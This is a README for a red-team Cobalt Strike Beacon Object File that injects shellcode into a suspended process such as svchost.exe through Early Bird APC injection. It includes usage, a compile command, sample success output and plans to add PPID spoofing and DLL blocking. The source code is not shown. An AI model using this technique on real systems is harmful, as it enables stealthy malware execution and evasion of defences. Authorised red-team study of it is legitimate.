Beacon Object File (BOF) that spawns an arbitrary process from beacons memory in a suspended state, inject shellcode, hijack main thread with APC, and execute shellcode; using the Early Bird injection method taught by @SEKTOR7net in RED TEAM Operator: Malware Development Intermediate.

### Run from Cobalt Strike Beacon Console
+ After compile import the hollow.cna script into Cobalt Strikes Script Manager
```bash
beacon> help hollow
Synopsis: hollow /path/to/hollow/pe /local/path/to/shellcode.bin
beacon> hollow svchost.exe /Users/bobby.cooke/popCalc.bin

[*]             (@n00bRage|github.com/josephkingstone) | (@OakTree__|github.com/git-oaktree)
[*] Reading shellcode from: /Users/bobby.cooke/popCalc.bin
[+] Success - Spawned process for svchost.exe at 5464 (PID)
[+] Success - Allocated RE memory in remote process 5464 (PID) at: 0x000001A83BEC0000
[+] Success - Wrote 280 bytes to memory in remote process 5464 (PID) at 0x000001A83BEC0000
[+] Success - APC queued for main thread of 5464 (PID) to shellcode address 0x000001A83BEC0000
[+] Success - Your thread was resumed and your shellcode is being executed within the remote process!
```

### Compile with x64 MinGW (only tested from macOS):
```bash
x86_64-w64-mingw32-gcc -c hollow.x64.c -o hollow.x64.o
```

### To Do List
+ Refactor code to make it more modular/clean
+ Implement this into github.com/boku7/SPAWN
  - Combine this with the PPID spoofing and blockdll features of SPAWN
